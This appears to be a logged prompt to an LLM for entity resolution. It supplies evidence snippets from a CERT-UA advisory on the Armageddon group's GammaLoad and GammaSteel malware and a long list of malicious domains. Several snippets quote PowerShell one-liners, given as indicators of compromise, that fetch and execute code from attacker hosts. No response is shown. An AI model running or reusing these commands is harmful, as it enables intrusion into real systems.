=== REQUEST (gemini gemini-3.7-flash) ===
--- sampling ---
{"temperature":0}
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. GammaLoad [aka GammaLoad.PS1]
E2. TRYxaEbX.ps1
E3. GraphSteel
E4. GammaLoad.PS1_v2
E5. stage1.ps1
E6. OUTSTEEL
E7. z.ps1
E8. stage2.ps1
E9. microsoft-cortana.exe
E10. TRYxaEbX_2.ps1
E11. .NET Framework
E12. MarsStealer
E13. WhisperPack
E14. GrimPlant
E15. RelicRace
E16. dnsmasq
E17. jDownloader
E18. FTPGetter
E19. JesterStealer
E20. Hashcat
E21. needrestart
E22. Meterpreter
E23. Paltalk
E24. DarkCrystal RAT
E25. Pterodo
E26. PowerShell [aka powershell.exe]
E27. WINWORD.EXE
E28. 223329.exe [aka 966449.exe]
E29. POWERGAP
E30. cmd.exe
E31. 62ea.exe
E32. SPECTR.Shell
E33. AdvancedRun.exe
E34. MS PowerPoint
E35. GammaSteel.NET
E36. HarvesterX
E37. PowerShell (powershell.exe)
E38. GammaSteel.PS1
E39. co87972.tmweb.ru
E40. acteran.ru
E41. bilitora.ru
E42. surname192.temp.swtest.ru
E43. apoxipodes.ru
E44. fishitor.ru
E45. a0695487.xsph.ru
E46. tiloraso.ru
E47. a0698649.xsph.ru
E48. billyhot.ru
E49. dodortar.ru
E50. candidar.ru
E51. lnk-upload.dodortar.ru
E52. a0698262.xsph.ru
E53. motocheck.in
E54. stormpredictor.host
E55. rmssrv3.ru
E56. meteolink.host
E57. successilin.top
E58. tortunas.ru
E59. erwini.ru
E60. mulleti.ru
E61. bul-opros.top
E62. iol.pt
E63. rmssrv2.ru
E64. toknowall.com
E65. gopoppers.com
E66. kopratiso.ru
E67. co-opros.top
E68. podologaneri.it
E69. districoperav.icu
E70. potrakit.ru
E71. giraffe-tour.ru
E72. rivierafamily.com
E73. nitikora.ru
E74. tridiuma.ru
E75. yandex.ru
E76. leonardis.ru
E77. varanasiclick.ru
E78. olei.ro
E79. jevejosader.top
E80. enlamentedeunasesor.com
E81. milotrad.ru
E82. milotraf.ru
E83. s8.h.mchost.ru
E84. aspe.ro
E85. omyce.ru
E86. pastebin.com
E87. jokotras.ru
E88. afi-opros.top
E89. nikotod.ru
E90. mitraseo.hol.es
E91. parodadoca.ru
E92. marmaris.com.ua
E93. xsph.ru
E94. rmssrv4.ru
E95. nx0.ru
E96. ncscc.gov.ua
E97. www.msftncsi.com
E98. staystrongjewels.com
E99. wi-opros.top
E100. xcasinobonuses.net
E101. ndlestomak.top
E102. ns2-dns.com
E103. servebeer.com
E104. evil.server.com
E105. 3utilities.com
E106. ns.ns2-dns.com
E107. agreminj.com
E108. ns3-dns.com
E109. airmauritiusticket.com
E110. viewdns.net
E111. mail.nais-gov.org
E112. bounceme.net
E113. ddns.net
E114. eo2mxtqmeqzafqi.m.pipedream.net
E115. plexbd.net
E116. sytes.net
E117. brunoboys.net
E118. cdn.jsdelivr.net
E119. dcshost.net
E120. gov-ua.info
E121. president.gov.ua.administration.vakansiyi.administration.president.gov-ua.info
E122. freedynamicdns.net
E123. dyndns.com
E124. ns.ns3-dns.com
E125. gotdns.ch
E126. eoiw8lhjwuc3sh2.m.pipedream.net
E127. www.facebook.com
E128. eo9p1d2bfmioiot.m.pipedream.net
E129. www.michiganmastereltiempo.com
E130. www.symantec.com
E131. eoy7zvsvn6xfcmy.m.pipedream.net
E132. atlantar.ru
E133. motoristo.ru
E134. moolin.ru
E135. bubenci.ru
E136. callsol.ru
E137. clipperso.ru
E138. cooperi.ru
E139. detroito.ru
E140. farafauler.ru
E141. flayga.ru
E142. ganara.ru
E143. hawksi.ru
E144. hofsteder.ru
E145. kilitro.ru
E146. kurapat.ru
E147. lnasfe.ru
E148. lopasts.ru
E149. mafirti.ru
E150. metanat.ru
E151. mitlubald.ru
E152. paparat.ru
E153. pasamart.ru
E154. qkcew.ru
E155. rncsq.ru
E156. tarlit.ru
E157. tbwelo.ru
E158. wicksl.ru
E159. xcqef.ru
E160. nxkad.ru
E161. dnslookup.seowebchecker.com
